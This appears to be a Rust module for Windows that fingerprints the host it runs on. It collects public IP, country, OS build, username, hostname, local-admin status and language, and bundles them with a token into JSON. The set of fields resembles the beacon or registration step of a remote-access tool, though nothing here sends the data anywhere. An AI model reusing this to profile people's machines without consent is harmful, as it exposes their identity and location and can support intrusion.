use serde_json::{json, Value};
use std::env;
use std::ffi::OsString;
use std::os::windows::ffi::OsStringExt;
use winapi::um::sysinfoapi::GetVersionExW;
use winapi::um::winnt::OSVERSIONINFOEXW;
use winapi::um::securitybaseapi::{CheckTokenMembership, AllocateAndInitializeSid, FreeSid};
use winapi::um::winnt::{SID_IDENTIFIER_AUTHORITY, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, PSID};
use winapi::um::winnls::{GetUserDefaultUILanguage, LCIDToLocaleName};
use winapi::shared::minwindef::{BOOL, TRUE, FALSE};
use winapi::shared::ntdef::NULL;
use crate::config::debug_log;

const LOCALE_NAME_MAX_LENGTH: usize = 85;

pub fn os_version() -> String {
    unsafe {
        let mut osvi: OSVERSIONINFOEXW = std::mem::zeroed();
        osvi.dwOSVersionInfoSize = std::mem::size_of::<OSVERSIONINFOEXW>() as u32;
        
        if GetVersionExW(&mut osvi as *mut _ as *mut _) == 0 {
            return "Unknown".to_string();
        }
        
        format!("Windows {}.{} Build {}", 
                osvi.dwMajorVersion, 
                osvi.dwMinorVersion, 
                osvi.dwBuildNumber)
    }
}

pub async fn ip_address() -> String {
    match reqwest::get("http://api.ipify.org").await {
        Ok(response) => {
            if response.status().is_success() {
                match response.text().await {
                    Ok(ip) => ip.trim().to_string(),
                    Err(_) => "N/A".to_string(),
                }
            } else {
                "N/A".to_string()
            }
        },
        Err(_) => "N/A".to_string(),
    }
}

pub async fn geo_location(ip_address: &str) -> Result<String, String> {
    // Verifica se é um IP válido (simplificado)
    if ip_address.is_empty() || ip_address == "127.0.0.1" {
        return Ok("Localhost".to_string());
    }

    let url = format!("http://ip-api.com/json/{}", ip_address);
    
    match reqwest::get(&url).await {
        Ok(response) => {
            if !response.status().is_success() {
                return Err(format!("error {}", response.status().as_u16()));
            }
            
            match response.json::<Value>().await {
                Ok(json) => {
                    if json["status"] == "fail" {
                        return Err(json["message"].as_str().unwrap_or("Unknown error").to_string());
                    }
                    
                    Ok(json["country"].as_str().unwrap_or("Unknown").to_string())
                },
                Err(e) => Err(format!("error {}", e)),
            }
        },
        Err(e) => Err(format!("error {}", e)),
    }
}

pub fn is_admin() -> bool {
    unsafe {
        let mut is_admin: BOOL = FALSE;
        let mut administrators_group: PSID = NULL;
        
        let nt_authority = SID_IDENTIFIER_AUTHORITY {
            Value: [0, 0, 0, 0, 0, 5],
        };
        
        if AllocateAndInitializeSid(
            &nt_authority as *const _ as *mut _,
            2,
            SECURITY_BUILTIN_DOMAIN_RID,
            DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0,
            &mut administrators_group,
        ) != 0 {
            CheckTokenMembership(NULL, administrators_group, &mut is_admin);
            FreeSid(administrators_group);
        }
        
        is_admin == TRUE
    }
}

pub fn get_system_language() -> String {
    unsafe {
        let lang_id = GetUserDefaultUILanguage();
        let mut lang_name: [u16; LOCALE_NAME_MAX_LENGTH] = [0; LOCALE_NAME_MAX_LENGTH];
        
        if LCIDToLocaleName(
            lang_id as u32,
            lang_name.as_mut_ptr(),
            LOCALE_NAME_MAX_LENGTH as i32,
            0,
        ) == 0 {
            return "Unknown".to_string();
        }
        
        // Encontra o final da string (primeiro zero)
        let len = lang_name.iter().position(|&x| x == 0).unwrap_or(lang_name.len());
        let os_string = OsString::from_wide(&lang_name[..len]);
        
        match os_string.into_string() {
            Ok(s) => s,
            Err(_) => "Unknown".to_string(),
        }
    }
}

pub async fn infos(token: &str) -> Value {
    let ip = ip_address().await;
    let geo = match geo_location(&ip).await {
        Ok(location) => location,
        Err(_) => "Unknown".to_string(),
    };
    
    let username = env::var("USERNAME").unwrap_or_else(|_| "Unknown".to_string());
    let hostname = env::var("COMPUTERNAME").unwrap_or_else(|_| "Unknown".to_string());
    
    let req = json!({
        "token": token,
        "ip_address": ip,
        "geo_location": geo,
        "operating_system": os_version(),
        "username": username,
        "hostname": hostname,
        "is_local_admin": is_admin(),
        "language": get_system_language(),
    });
    
    debug_log(&serde_json::to_string_pretty(&req).unwrap_or_else(|_| "Failed to serialize JSON".to_string()));
    
    req
}